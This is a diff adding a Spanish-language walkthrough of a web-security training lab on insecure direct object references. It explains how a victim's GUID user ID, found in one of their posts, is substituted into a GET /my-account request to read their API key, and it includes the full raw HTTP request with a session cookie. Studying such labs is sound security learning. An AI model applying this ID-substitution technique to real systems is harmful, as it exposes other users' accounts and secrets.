@@ -134,7 +134,34 @@ Connection: close
 
 ```
 
+# User ID controlled by request parameter, with unpredictable user IDs
 
+Para este laboratorio nos damos cuenta que ahora la peticion get esta hecha en base a un id tipo random o presumiblemente
+GUID como no podemos saber como generar esa para el usuario carlos navegamos un poco dentro de la pagina 
+y nos damos cuenta que en un post que hizo carlos y ahi se encentra su user id  y con ese hacemos la peticion get y nos
+deja ver su api KEY.
+
+```
+GET /my-account?id=82a032e7-c10b-457b-96fd-bdbcf02faa99 HTTP/1.1
+Host: 0a07000f04c824bcc0afcb9400c700cd.web-security-academy.net
+Cookie: session=87MYGsqfcMQKo9t9Urban5frASCe5IWL
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a07000f04c824bcc0afcb9400c700cd.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+
+```
 
 
 
